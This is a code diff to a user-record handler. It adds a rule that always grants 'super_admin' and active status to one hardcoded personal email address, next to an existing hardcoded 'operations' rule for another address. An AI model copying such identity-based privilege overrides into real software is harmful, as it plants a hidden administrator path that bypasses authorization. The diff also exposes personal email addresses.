@@ -42,6 +42,9 @@ const prepareCollectionPayload = ({ collectionName, payload, existing = null, ac
     if (collectionName === 'users') {
         const nextPayload = payload || {};
         const targetEmail = normalizeEmail(nextPayload.email || existing?.email);
+        if (targetEmail === 'maycolljaramillo01@gmail.com') {
+            return { ...nextPayload, role: 'super_admin', isActive: true };
+        }
         if (targetEmail === 'estebanantonio02@gmail.com') {
             return { ...nextPayload, role: 'operations', isActive: nextPayload.isActive !== false };
         }
